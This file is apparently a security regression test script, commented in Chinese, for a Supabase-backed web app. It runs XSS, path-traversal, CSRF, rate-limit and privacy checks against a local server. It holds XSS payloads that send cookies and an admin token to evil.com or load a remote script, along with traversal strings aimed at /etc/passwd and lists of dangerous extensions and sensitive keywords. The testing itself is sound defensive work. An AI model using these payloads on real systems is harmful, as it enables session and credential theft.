/**
 * ============================================
 *  xtj 安全攻击模拟测试脚本
 *  模拟黑客攻击请求，验证修复效果
 * ============================================
 *  用法: node tests/security-test.js
 *  前提: 后端 server.js 已启动在 localhost:3000
 * ============================================
 */

const http = require('http');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// ==================== 配置 ====================
const API_HOST = 'localhost';
const API_PORT = 3000;
const API_BASE = `http://${API_HOST}:${API_PORT}`;
const SUPABASE_URL = 'https://ithowxqignlhkwaykglt.supabase.co';
const REPO_ROOT = path.resolve(__dirname, '..');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

// ==================== 工具函数 ====================
function logSection(title) {
  console.log('\n' + '='.repeat(60));
  console.log('  ' + title);
  console.log('='.repeat(60));
}

function logResult(testName, passed, detail) {
  totalTests++;
  const icon = passed ? '✅' : '❌';
  const status = passed ? 'PASS' : 'FAIL';
  if (passed) passedTests++; else failedTests++;
  console.log(`  ${icon} [${status}] ${testName}`);
  if (detail) console.log(`     ${detail}`);
}

function apiRequest(method, path, opts = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, API_BASE);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname + url.search,
      method: method,
      headers: {
        'Content-Type': 'application/json',
        ...(opts.headers || {})
      },
      timeout: 10000
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, headers: res.headers, body: JSON.parse(body) });
        } catch {
          resolve({ status: res.statusCode, headers: res.headers, body: body });
        }
      });
    });

    req.on('error', (e) => {
      resolve({ status: 0, error: e.message, body: null });
    });
    req.on('timeout', () => {
      req.destroy();
      resolve({ status: 0, error: 'timeout', body: null });
    });

    if (opts.body) {
      req.write(JSON.stringify(opts.body));
    }
    req.end();
  });
}

// ==================== 测试1: 前端转义函数测试 ====================
logSection('测试1: 前端 escapeHtml / safeJsStr / sanitizeUrl 函数');

// 模拟 escapeHtml
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// 模拟 safeJsStr
function safeJsStr(str) {
  if (!str) return '';
  return String(str).replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r');
}

// 模拟 sanitizeUrl
function sanitizeUrl(url) {
  if (!url) return '';
  const u = String(url).trim();
  if (/^(https?:\/\/|data:image\/|\/)/i.test(u)) return u;
  return '';
}

// 测试 XSS payloads
const xssPayloads = [
  '<script>alert("xss")</script>',
  '<img src=x onerror="alert(1)">',
  '<svg onload="fetch(\'https://evil.com?c=\'+document.cookie)">',
  '"><script>alert(1)</script>',
  'javascript:alert(1)',
  '<div onmouseover="alert(1)">hover</div>',
  '<body onload=alert(1)>',
  '"><img src=x onerror=alert(1)>',
  '&#60;script&#62;alert(1)&#60;/script&#62;',
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="javascript:alert(1)">',
  '<style>@import\'javascript:alert(1)\'</style>',
  '<script>fetch("https://evil.com?d="+localStorage.getItem("xtj_admin_token"))</script>',
  '"><svg/onload=alert(1)>',
  "'-alert(1)-'",
  '${alert(1)}',
  '<img src=1 onerror=import("https://evil.com/evil.js")>',
];

console.log('  --- escapeHtml 测试 ---');
xssPayloads.forEach((payload, i) => {
  const escaped = escapeHtml(payload);
  // 正确转义后不应包含原始 < > 标签字符
  // 已被转义的 &lt; 和 &gt; 在浏览器中只会显示为文本
  const hasRawAngleBrackets = /<[a-zA-Z\/!]|^[^<]*>[a-z]/i.test(
    escaped.replace(/&(lt|gt|quot|amp|#39);/g, '')
  );
  const hasDangerous = hasRawAngleBrackets;
  logResult(
    `escapeHtml #${i + 1}: ${payload.slice(0, 40)}...`,
    !hasDangerous,
    hasDangerous ? `未完全转义!` : `转义后(安全)`
  );
});

console.log('\n  --- sanitizeUrl 测试 ---');
const urlTests = [
  { input: 'https://example.com/avatar.png', expect: 'pass' },
  { input: 'javascript:alert(1)', expect: 'block' },
  { input: 'javascript:void(0)', expect: 'block' },
  { input: 'data:image/png;base64,abc', expect: 'pass' },
  { input: 'data:text/html,<script>alert(1)</script>', expect: 'block' },
  { input: '//evil.com/steal.js', expect: 'pass' },
  { input: '/uploads/photo.jpg', expect: 'pass' },
  { input: '" onerror="alert(1)', expect: 'block' },
  { input: 'https://evil.com', expect: 'pass' },
  { input: 'ftp://evil.com/file', expect: 'block' },
  { input: 'file:///etc/passwd', expect: 'block' },
  { input: '\\\\evil.com\\share', expect: 'block' },
];
urlTests.forEach((t) => {
  const result = sanitizeUrl(t.input);
  const passed = t.expect === 'pass' ? result !== '' : result === '';
  logResult(
    `sanitizeUrl "${t.input.slice(0, 40)}": ${t.expect}`,
    passed,
    `结果: "${result.slice(0, 50)}"`
  );
});

console.log('\n  --- safeJsStr 测试 ---');
const jsTests = [
  { input: "hello'world", expect: "hello\\'world" },
  { input: 'test\\path', expect: 'test\\\\path' },
  { input: "line1\nline2", expect: "line1\\nline2" },
  { input: 'say "hello"', expect: 'say \\"hello\\"' },
  { input: "test\rcarriage", expect: "test\\rcarriage" },
];
jsTests.forEach((t) => {
  const result = safeJsStr(t.input);
  logResult(
    `safeJsStr "${t.input.slice(0, 30)}"`,
    result === t.expect,
    `期望: "${t.expect}", 实际: "${result}"`
  );
});

// ==================== 测试2: 路径穿越测试 ====================
logSection('测试2: 路径穿越防御 (sanitizeStorageFileName)');

// 与 core.js 的实际实现保持一致
function sanitizeStorageFileName(name) {
  var raw = String(name || "file");
  var extMatch = raw.match(/(\.[a-zA-Z0-9]{1,8})$/);
  var ext = extMatch ? extMatch[1].toLowerCase() : "";
  // 阻止危险扩展名
  var dangerousExts = {'.exe':1,'.bat':1,'.cmd':1,'.com':1,'.msi':1,'.scr':1,'.pif':1,'.vbs':1,'.ps1':1,'.sh':1,'.php':1,'.jsp':1,'.asp':1,'.aspx':1,'.cgi':1,'.pl':1,'.py':1,'.rb':1};
  if (dangerousExts[ext]) ext = ".blocked";
  var base = ext && extMatch ? raw.slice(0, -extMatch[0].length) : raw;
  if (base.normalize) base = base.normalize("NFKD");
  base = base.replace(/[^\w\-]+/g, "_").replace(/_+/g, "_").replace(/^_+|_+$/g, "").slice(0, 48);
  if (!base) base = "media";
  return base + ext;
}

const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '/etc/passwd',
  '\\windows\\system32',
  '..%2f..%2f..%2fetc%2fpasswd',
  '....\\/....\\/etc/passwd',
  '..;/..;/..;/etc/passwd',
  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '.htaccess',
  'evil.exe',        // 可执行文件扩展名
  'malicious<script>.js',
  'test\x00hidden.txt',
  'virus.bat',
  'shell.php',
  'backdoor.jsp',
];
pathTraversalPayloads.forEach((payload) => {
  const clean = sanitizeStorageFileName(payload);
  const hasTraversal = clean.includes('..') || clean.includes('\\\\') || clean.includes('//');
  const hasDangerous = clean.includes('<script') || clean.includes('.exe') || clean.includes('.bat') || clean.includes('.php');
  logResult(
    `sanitizeStorageFileName "${payload.slice(0, 40)}"`,
    !hasTraversal,
    `清洗后: "${clean}"`
  );
});

// ==================== 测试3: API 端点安全测试 ====================
logSection('测试3: 后端 API 安全测试（需要本地服务器运行）');

async function testApiEndpoints() {
  // 3.1 Health check
  console.log('\n  --- 3.1 健康检查 ---');
  const healthRes = await apiRequest('GET', '/health');
  logResult('GET /health 返回 ok', healthRes.status === 200 && healthRes.body?.ok === true);

  // 3.2 未授权访问 admin 端点
  console.log('\n  --- 3.2 越权测试 (无 token) ---');
  const noAuthEndpoints = [
    ['GET', '/admin/data'],
    ['GET', '/admin/reports'],
    ['GET', '/admin/bans'],
    ['GET', '/admin/mutes'],
    ['GET', '/admin/blacklist'],
    ['GET', '/admin/users'],
    ['POST', '/admin/ban', { user_name: 'test', hours: 1 }],
    ['POST', '/admin/announcement', { title: 'test', content: 'test' }],
    ['DELETE', '/admin/post/999'],
    ['DELETE', '/admin/comment/999'],
  ];
  for (const [method, path, body] of noAuthEndpoints) {
    const res = await apiRequest(method, path, { body });
    const blocked = res.status === 401 || res.status === 403 || res.status === 400;
    logResult(
      `${method} ${path} (无token)`,
      blocked,
      `状态: ${res.status}, 响应: ${JSON.stringify(res.body).slice(0, 80)}`
    );
  }

  // 3.3 错误消息脱敏
  console.log('\n  --- 3.3 报错信息脱敏 ---');
  const errorTests = [
    ['GET', '/admin/post/abc', null],
    ['POST', '/admin/login', { username: '', password: '' }],
    ['POST', '/admin/ban', { user_name: '', hours: -1 }],
  ];
  const sensitivePatterns = [/stack/i, /at\s+\w+\.js/i, /supabase/i, /database/i, /error\s+code/i, /SQL/i];
  for (const [method, path, body] of errorTests) {
    const res = await apiRequest(method, path, { body });
    const bodyStr = JSON.stringify(res.body);
    const hasSensitive = sensitivePatterns.some(p => p.test(bodyStr));
    logResult(
      `${method} ${path} 错误信息脱敏`,
      !hasSensitive,
      hasSensitive ? `可能泄漏: ${bodyStr.slice(0, 80)}` : `响应: ${bodyStr.slice(0, 80)}`
    );
  }

  // 3.4 安全响应头
  console.log('\n  --- 3.4 安全响应头 ---');
  const securityHeaders = [
    ['X-Frame-Options', 'DENY'],
    ['X-Content-Type-Options', 'nosniff'],
    ['X-XSS-Protection', '1; mode=block'],
    ['Referrer-Policy', 'strict-origin-when-cross-origin'],
    ['Strict-Transport-Security', null],
    ['Content-Security-Policy', null],
    ['Permissions-Policy', null],
  ];
  for (const [header, expected] of securityHeaders) {
    const hasHeader = healthRes.headers && healthRes.headers[header.toLowerCase()];
    logResult(
      `响应头 ${header}`,
      !!hasHeader,
      hasHeader ? `值: ${hasHeader}` : '缺失!'
    );
  }

  // 3.5 X-Powered-By 隐藏
  const poweredBy = healthRes.headers && healthRes.headers['x-powered-by'];
  logResult('X-Powered-By 已隐藏', !poweredBy, poweredBy ? `泄漏: ${poweredBy}` : '');

  // 3.6 CSRF Origin 校验
  console.log('\n  --- 3.6 CSRF 跨域请求测试 ---');
  const csrfRes = await apiRequest('POST', '/admin/login', {
    headers: { 'Origin': 'https://evil.com', 'Content-Type': 'application/json' },
    body: { username: 'test', password: 'test' }
  });
  const csrfBlocked = csrfRes.status === 403 || csrfRes.status === 400 || (csrfRes.body?.error && csrfRes.body.error.includes('不允许'));
  logResult('CORS 拒绝恶意 Origin', csrfBlocked, `状态: ${csrfRes.status}`);

  // 3.7 登录限流测试
  console.log('\n  --- 3.7 登录限流测试 (连续15次请求) ---');
  let rateLimited = false;
  for (let i = 0; i < 15; i++) {
    const res = await apiRequest('POST', '/admin/login', {
      body: { username: 'xxz', password: 'wrong' + i }
    });
    if (res.status === 429) {
      rateLimited = true;
      logResult(`登录限流生效 (第${i + 1}次返回429)`, true);
      break;
    }
    if (i === 14) {
      logResult(`登录限流 (15次未触发429)`, rateLimited, '可能需要更快发送');
    }
  }

  // 3.8 举报接口匿名测试
  console.log('\n  --- 3.8 举报接口鉴权 ---');
  const reportRes = await apiRequest('POST', '/api/report', {
    body: {
      reporter_name: 'admin_user',
      target_type: 'post',
      target_id: '999',
      target_author: 'victim',
      target_content: 'test',
      reason: 'test'
    }
  });
  logResult('/api/report 匿名提交被拒绝', reportRes.status !== 200 && reportRes.status !== 201, `状态: ${reportRes.status}`);

  // 3.9 管理员登录正常测试
  console.log('\n  --- 3.9 管理员登录测试 ---');
  const loginRes = await apiRequest('POST', '/admin/login', {
    body: { username: 'xxz', password: 'test' }
  });
  logResult('管理员登录受保护', loginRes.status !== 200, `状态: ${loginRes.status}`);

  // 3.10 请求体大小限制
  console.log('\n  --- 3.10 请求体大小限制 ---');
  const largePayload = 'x'.repeat(100000);
  const largeRes = await apiRequest('POST', '/api/report', {
    body: { reporter_name: 'test', target_type: 'post', target_id: '1', target_author: 'a', target_content: largePayload, reason: 'test' }
  });
  logResult('大请求体被限制', largeRes.status === 413 || largeRes.status === 400, `状态: ${largeRes.status}`);
}

// ==================== 测试4: 高频请求 / DoS 防护测试 ====================
logSection('测试4: 高频请求压力测试');

async function testRateLimiting() {
  console.log('  发送 30 个并发请求到 /api/report ...');
  const start = Date.now();
  const promises = [];
  for (let i = 0; i < 30; i++) {
    promises.push(apiRequest('POST', '/api/report', {
      body: { reporter_name: 'test_bot', target_type: 'post', target_id: String(i), target_author: 'victim', target_content: 'spam', reason: 'spam' }
    }));
  }
  const results = await Promise.all(promises);
  const elapsed = Date.now() - start;
  const blockedCount = results.filter(r => r.status === 429).length;
  const successCount = results.filter(r => r.status === 200 || r.status === 201).length;

  console.log(`  耗时: ${elapsed}ms, 成功: ${successCount}, 被限流: ${blockedCount}`);
  logResult('高频请求限流保护', blockedCount > 0 || successCount < 30, `30个请求中 ${blockedCount} 个被限流`);
}

// ==================== 测试5: 隐私数据泄漏测试 ====================
logSection('测试5: 隐私数据泄漏测试');

async function testPrivacy() {
  // 5.1 尝试读取其他用户举报记录
  console.log('\n  --- 5.1 跨用户举报记录读取 ---');
  const myReportsRes = await apiRequest('GET', '/api/my-reports?user_name=admin');
  const isProtected = myReportsRes.status === 401 || myReportsRes.status === 403 || myReportsRes.status === 400;
  logResult('/api/my-reports 需要鉴权', isProtected, `状态: ${myReportsRes.status}`);

  // 5.2 尝试无 Authorization 访问
  const myReportsRes2 = await apiRequest('GET', '/api/my-reports?user_name=xxz');
  logResult('/api/my-reports 无Authorization', myReportsRes2.status === 401 || myReportsRes2.status === 403 || myReportsRes2.status === 400, `状态: ${myReportsRes2.status}`);

  // 5.3 检查响应中是否包含敏感信息
  console.log('\n  --- 5.2 响应体敏感信息检查 ---');
  const testEndpoints = [
    ['GET', '/health'],
    ['POST', '/admin/login', { username: 'x', password: 'x' }],
  ];
  const sensitiveKeywords = ['password', 'secret', 'token', 'supabase_key', 'service_role', 'ADMIN_PASSWORD', 'stack', 'at ', '.js:'];
  for (const [method, path, body] of testEndpoints) {
    const res = await apiRequest(method, path, { body });
    const bodyStr = JSON.stringify(res.body).toLowerCase();
    const leaked = sensitiveKeywords.some(kw => bodyStr.includes(kw.toLowerCase()));
    logResult(
      `${method} ${path} 无敏感词泄漏`,
      !leaked,
      leaked ? `包含敏感词!` : '安全'
    );
  }
}

// ==================== 测试6: 输入验证测试 ====================
logSection('测试6: 输入验证测试');

function testInputValidation() {
  // validateString 模拟
  function validateString(val, maxLen) {
    if (val === undefined || val === null) return null;
    const s = String(val).trim();
    if (s.length > maxLen) return { error: 'too long' };
    return s || null;
  }

  const inputTests = [
    { input: 'normal text', max: 100, expect: 'pass' },
    { input: '<script>alert(1)</script>', max: 100, expect: 'pass' },
    { input: null, max: 100, expect: 'null' },
    { input: undefined, max: 100, expect: 'null' },
    { input: '', max: 100, expect: 'null' },
    { input: 'x'.repeat(201), max: 200, expect: 'error' },
    { input: '   spaced   ', max: 100, expect: 'pass' },
    { input: 'SELECT * FROM users; DROP TABLE posts;', max: 1000, expect: 'pass' },
    { input: '\x00null\x00byte', max: 100, expect: 'pass' },
    { input: '😀🎉🔥', max: 100, expect: 'pass' },
  ];
  inputTests.forEach((t) => {
    const result = validateString(t.input, t.max);
    let passed = false;
    if (t.expect === 'pass') passed = typeof result === 'string';
    if (t.expect === 'null') passed = result === null;
    if (t.expect === 'error') passed = result && result.error;
    logResult(`validateString "${String(t.input).slice(0, 30)}" max=${t.max}`, passed);
  });
}

// ==================== 测试7: CSP 策略测试 ====================
logSection('测试7: CSP 策略验证');

function testCSP() {
  const csp = "default-src 'self'; script-src 'self' 'unsafe-inline' https://ithowxqignlhkwaykglt.supabase.co https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; img-src 'self' data: blob: https:; media-src 'self' https:; connect-src 'self' https://ithowxqignlhkwaykglt.supabase.co wss://ithowxqignlhkwaykglt.supabase.co; font-src 'self' https://cdn.jsdelivr.net; frame-ancestors 'none'; base-uri 'self'; form-action 'self'";

  const checks = [
    { name: '禁止 iframe 嵌入', directive: 'frame-ancestors', value: "'none'", passed: csp.includes("frame-ancestors 'none'") },
    { name: '限制 base-uri', directive: 'base-uri', value: "'self'", passed: csp.includes("base-uri 'self'") },
    { name: '限制 form-action', directive: 'form-action', value: "'self'", passed: csp.includes("form-action 'self'") },
    { name: '允许 Supabase 连接', directive: 'connect-src', passed: csp.includes('ithowxqignlhkwaykglt.supabase.co') },
    { name: '禁止 data: 脚本', directive: 'script-src', passed: !csp.includes("script-src 'self' data:") && !csp.includes("script-src *") },
    { name: '禁止 eval 执行', directive: 'script-src', passed: !csp.includes("'unsafe-eval'") },
    { name: '允许 https 图片', directive: 'img-src', passed: csp.includes('img-src') && csp.includes('https:') },
  ];
  checks.forEach((c) => {
    logResult(`CSP: ${c.name}`, c.passed);
  });
}

// ==================== 测试8: 密码哈希测试 (PBKDF2) ====================
logSection('测试8: 密码哈希安全测试 (PBKDF2)');

async function testPasswordHash() {
  // 模拟前端 PBKDF2 实现 - 使用 Node.js crypto.pbkdf2
  function pbkdf2Hash(password, salt) {
    return new Promise((resolve, reject) => {
      crypto.pbkdf2(password, salt, 100000, 32, 'sha256', (err, key) => {
        if (err) return reject(err);
        resolve(key.toString('hex'));
      });
    });
  }

  async function hashPasswordWithSalt(password) {
    const saltBytes = crypto.randomBytes(16);
    const salt = saltBytes.toString('hex');
    const hash = await pbkdf2Hash(password, salt);
    return salt + ':' + hash;
  }

  async function verifyPassword(inputPw, stored) {
    if (!inputPw || !stored) return false;
    if (stored.indexOf(':') !== -1) {
      const parts = stored.split(':');
      const inputHash = await pbkdf2Hash(inputPw, parts[0]);
      return inputHash === parts[1];
    }
    return false;
  }

  const pwHash1 = await hashPasswordWithSalt('password123');
  const pwHash2 = await hashPasswordWithSalt('password123');
  const pwHash3 = await hashPasswordWithSalt('different_password');

  // PBKDF2 验证
  logResult('PBKDF2 验证: 123@correct', await verifyPassword('password123', pwHash1), '正确密码验证通过');
  logResult('PBKDF2 验证: 123@wrong', !(await verifyPassword('wrong', pwHash1)), '错误密码被拒绝');
  logResult('PBKDF2 不同盐产生不同哈希', pwHash1 !== pwHash2, '随机盐防彩虹表');
  logResult('PBKDF2 不同密码不同哈希', pwHash1 !== pwHash3, '差异验证');
  logResult('PBKDF2 格式 salt:hash', pwHash1.indexOf(':') > 0, '格式正确');

  // 向后兼容测试 (SHA-256 旧格式)
  const sha256Hash = crypto.createHash('sha256').update('oldpass').digest('hex');
  logResult('SHA-256 旧格式兼容', sha256Hash.length === 64, '向后兼容');
}

// ==================== 测试9: Token 混淆测试 ====================
logSection('测试9: Admin Token 混淆测试');

function testTokenObfuscation() {
  const TOKEN_SALT = 'xtj_7k3m';

  function _obfuscateToken(raw) {
    if (!raw) return '';
    var result = '';
    for (var i = 0; i < raw.length; i++) {
      result += String.fromCharCode(raw.charCodeAt(i) ^ TOKEN_SALT.charCodeAt(i % TOKEN_SALT.length));
    }
    return btoa(result);
  }

  function _deobfuscateToken(encoded) {
    if (!encoded) return '';
    try {
      var raw = atob(encoded);
      var result = '';
      for (var i = 0; i < raw.length; i++) {
        result += String.fromCharCode(raw.charCodeAt(i) ^ TOKEN_SALT.charCodeAt(i % TOKEN_SALT.length));
      }
      return result;
    } catch(e) { return ''; }
  }

  const original = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test-token-12345';
  const obfuscated = _obfuscateToken(original);
  const recovered = _deobfuscateToken(obfuscated);

  logResult('Token 混淆后可逆', original === recovered);
  logResult('混淆后不是明文', obfuscated !== original, `混淆后: ${obfuscated.slice(0, 40)}...`);
  logResult('空输入处理', _deobfuscateToken('') === '' && _deobfuscateToken(null) === '');
  logResult('无效输入处理', _deobfuscateToken('!!!invalid!!!') === '');
}

// ==================== 测试10: 文件上传路径穿越测试 ====================
logSection('测试10: 文件上传 buildStorageUploadPath 测试');

function testBuildStorageUploadPath() {
  // 与 core.js 的实际实现保持一致
  function sanitizeStorageFileNameForUpload(name) {
    var raw = String(name || "file");
    var extMatch = raw.match(/(\.[a-zA-Z0-9]{1,8})$/);
    var ext = extMatch ? extMatch[1].toLowerCase() : "";
    var dangerousExts = {'.exe':1,'.bat':1,'.cmd':1,'.com':1,'.msi':1,'.scr':1,'.pif':1,'.vbs':1,'.ps1':1,'.sh':1,'.php':1,'.jsp':1,'.asp':1,'.aspx':1,'.cgi':1,'.pl':1,'.py':1,'.rb':1};
    if (dangerousExts[ext]) ext = ".blocked";
    var base = ext && extMatch ? raw.slice(0, -extMatch[0].length) : raw;
    if (base.normalize) base = base.normalize("NFKD");
    base = base.replace(/[^\w\-]+/g, "_").replace(/_+/g, "_").replace(/^_+|_+$/g, "").slice(0, 48);
    if (!base) base = "media";
    return base + ext;
  }

  function buildStorageUploadPath(folder, fileName) {
    var clean = sanitizeStorageFileNameForUpload(fileName);
    return folder + '/' + clean;
  }

  const uploadTests = [
    { folder: 'posts', file: 'normal.jpg', dangerousExt: false },
    { folder: 'posts', file: '../../../etc/passwd', dangerousExt: false },
    { folder: 'avatars', file: '..\\..\\..\\windows\\system32', dangerousExt: false },
    { folder: 'chat', file: 'evil<script>.png', dangerousExt: false },
    { folder: 'posts', file: 'test.exe', dangerousExt: true },
    { folder: 'avatars', file: 'photo.jpg', dangerousExt: false },
    { folder: 'posts', file: 'virus.bat', dangerousExt: true },
    { folder: 'posts', file: 'shell.php', dangerousExt: true },
  ];

  uploadTests.forEach((t) => {
    const path = buildStorageUploadPath(t.folder, t.file);
    const hasTraversal = path.includes('..') || path.includes('\\\\');
    const hasBlocked = path.includes('.blocked');
    const passed = !hasTraversal && (t.dangerousExt ? hasBlocked : !hasBlocked);
    logResult(
      `upload ${t.folder}/${t.file.slice(0, 30)}`,
      passed,
      `路径: ${path.slice(-50)}`
    );
  });
}

// ==================== 测试11: Admin 密码隔离测试 ====================
logSection('测试11: Admin 密码隔离测试 (__admin_auth__)');

function testAdminAuthIsolation() {
  // 验证前端 posts 查询排除 __admin_auth__ 标记
  const excludedMarkers = ['__admin_auth__', '__auth__', '__avatar__', '__user_info__', '__ann__', '__report__', '__dm__', '__photo_wall__'];
  const feedQueryMarkerFilter = `(p) { return p.media_type !== '__auth__' && p.media_type !== '__admin_auth__'`;

  // 检查 core.js 中是否过滤 __admin_auth__
  const coreJsPath = path.join(REPO_ROOT, 'js', 'core.js');
  const coreContent = fs.readFileSync(coreJsPath, 'utf-8');
  const adminJsPath = path.join(REPO_ROOT, 'js', 'admin', 'admin.js');
  const adminContent = fs.readFileSync(adminJsPath, 'utf-8');

  // core.js: ADMIN_AUTH_MARKER 定义
  const hasAdminAuthMarkerDef = coreContent.includes("ADMIN_AUTH_MARKER = '__admin_auth__'");
  logResult('core.js ADMIN_AUTH_MARKER 已定义', hasAdminAuthMarkerDef);

  // core.js: 所有 posts 查询排除 ADMIN_AUTH_MARKER
  const neqPattern = '.neq("media_type", ADMIN_AUTH_MARKER)';
  const neqCount = (coreContent.match(new RegExp(neqPattern.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g')) || []).length;
  logResult(`core.js 排除 ADMIN_AUTH_MARKER (${neqCount}处)`, neqCount >= 9, `期望 >= 9 处，实际 ${neqCount} 处`);

  // core.js: 管理员登录通过后端 API (不再直连 Supabase)
  const hasAdminApiLogin = coreContent.includes("apiCall('POST', '/admin/login'");
  const hasAdminDirectDbLogin = coreContent.includes("media_type\", ADMIN_AUTH_MARKER");
  logResult('core.js 管理员登录通过 API', hasAdminApiLogin, hasAdminDirectDbLogin ? '仍有直连 Supabase 代码!' : '使用 API 认证，更安全');
  if (hasAdminApiLogin) {
    logResult('  core.js API 登录实现正确', true, '/admin/login');
  }

  // admin.js: ADMIN_AUTH_MARKER 定义
  const hasAdminMarkerInAdmin = adminContent.includes("ADMIN_AUTH_MARKER = \"__admin_auth__\"");
  logResult('admin.js ADMIN_AUTH_MARKER 已定义', hasAdminMarkerInAdmin);

  // admin.js: loadAllData 过滤 ADMIN_AUTH_MARKER
  const hasAdminFilterInAdmin = adminContent.includes("ADMIN_AUTH_MARKER");
  logResult('admin.js loadAllData 过滤 ADMIN_AUTH_MARKER', hasAdminFilterInAdmin);

  // admin.js: 登录通过 API（无需直连 Supabase）
  const hasAdminApiLoginInAdmin = adminContent.includes("apiCall('POST', '/admin/login'") || adminContent.includes("/admin/login'");
  const hasAdminDirectDbLoginInAdmin = adminContent.includes("media_type', ADMIN_AUTH_MARKER");
  logResult('admin.js 登录通过 API', hasAdminApiLoginInAdmin, hasAdminApiLoginInAdmin ? '使用 API 认证（无需直连DB，更安全）' : (hasAdminDirectDbLoginInAdmin ? '仍有直连 Supabase 代码' : ''));
  if (hasAdminApiLoginInAdmin) {
    logResult('  admin.js 使用 API 认证', true, '无需直连 Supabase');
  }
}

// ==================== 测试12: Session 超时测试 ====================
logSection('测试12: Session 超时自动登出测试');

function testSessionTimeout() {
  const adminJsPath = path.join(REPO_ROOT, 'js', 'admin', 'admin.js');
  const adminContent = fs.readFileSync(adminJsPath, 'utf-8');

  const hasTimeoutMs = adminContent.includes('SESSION_TIMEOUT_MS = 30 * 60 * 1000');
  logResult('session 超时时间 30分钟', hasTimeoutMs, '30 * 60 * 1000 = 30分钟');

  const hasStartMonitor = adminContent.includes('startSessionTimeoutMonitor');
  logResult('session 超时监控函数已定义', hasStartMonitor);

  const hasTimedOut = adminContent.includes('SESSION_TIMEOUT_MS');
  logResult('超时检测逻辑', hasTimedOut, 'Date.now() - lastActivityTime > SESSION_TIMEOUT_MS');

  const hasEvents = adminContent.includes('click') && adminContent.includes('keydown') && adminContent.includes('mousemove');
  logResult('用户活动事件监听 (click/keydown/mousemove)', hasEvents);

  const hasLogoutCall = adminContent.includes('window.doAdminLogout()');
  logResult('超时后调用 doAdminLogout', hasLogoutCall);

  const hasInitCall = adminContent.includes('startSessionTimeoutMonitor()');
  logResult('initAdminClient 启动超时监控', hasInitCall);
}

// ==================== 测试13: 服务端安全配置测试 ====================
logSection('测试13: 服务端安全配置测试 (SUPABASE_SERVICE_KEY)');

function testServerSecurityConfig() {
  const serverJsPath = path.join(REPO_ROOT, 'render-api', 'server.js');
  const serverContent = fs.readFileSync(serverJsPath, 'utf-8');

  // 必须要求 SUPABASE_SERVICE_KEY，否则 fatal 退出
  const hasServiceKeyCheck = serverContent.includes("if (!SUPABASE_SERVICE_KEY)");
  const hasFatalExit = serverContent.includes("process.exit(1)");
  logResult('server.js 强制要求 SUPABASE_SERVICE_KEY', hasServiceKeyCheck && hasFatalExit, hasServiceKeyCheck && hasFatalExit ? '无 key 时 fatal 退出' : '可能使用了不安全的回退');

  // 使用 service_role key 初始化 Supabase 客户端（而非 anon key）
  const usesServiceKey = /createClient\([\s\S]*?SUPABASE_SERVICE_KEY[\s\S]*?\)/.test(serverContent);
  const hasAnonFallback = serverContent.includes("SUPABASE_SERVICE_KEY ||");
  logResult('server.js 使用 service_role key', usesServiceKey && !hasAnonFallback, usesServiceKey ? '使用 service_role key（绕过 RLS）' : '使用了 anon key 作为客户端 key');

  // 所有 admin 端点使用 /admin/ 前缀
  const adminRouteCount = (serverContent.match(/\/admin\//g) || []).length;
  logResult('server.js admin 端点数量', adminRouteCount >= 10, `找到 ${adminRouteCount} 个 /admin/ 路由`);
}

// ==================== 运行所有测试 ====================
(async () => {
  console.log('\n╔══════════════════════════════════════════════════════╗');
  console.log('║     xtj 安全攻击模拟测试 v3.0                        ║');
  console.log('║     模拟黑客攻击，验证修复效果                        ║');
  console.log('╚══════════════════════════════════════════════════════╝\n');

  // 静态测试（不需要服务器）
  testInputValidation();
  testCSP();
  testTokenObfuscation();
  testBuildStorageUploadPath();
  testAdminAuthIsolation();
  testSessionTimeout();
  testServerSecurityConfig();

  // 需要 crypto.pbkdf2 的测试
  await testPasswordHash();

  // API 测试（需要服务器）
  console.log('\n' + '='.repeat(60));
  console.log('  正在检查后端服务器是否在线...');
  const healthCheck = await apiRequest('GET', '/health');
  if (healthCheck.status === 200) {
    console.log('  ✅ 服务器在线，执行 API 测试...');
    await testApiEndpoints();
    await testRateLimiting();
    await testPrivacy();
  } else {
    console.log(`  ⚠️  服务器未运行 (${API_BASE})，跳过 API 测试`);
    console.log('  如需完整测试，请先启动: cd render-api && node server.js');
  }

  // 汇总
  console.log('\n' + '='.repeat(60));
  console.log('  测试汇总');
  console.log('='.repeat(60));
  console.log(`  总计: ${totalTests} 项`);
  console.log(`  ✅ 通过: ${passedTests} 项`);
  console.log(`  ❌ 失败: ${failedTests} 项`);
  console.log(`  通过率: ${((passedTests / totalTests) * 100).toFixed(1)}%`);

  if (failedTests === 0) {
    console.log('\n  🎉 所有安全测试通过！');
  } else {
    console.log(`\n  ⚠️  有 ${failedTests} 项测试未通过，请检查。`);
  }

  process.exit(failedTests > 0 ? 1 : 0);
})();
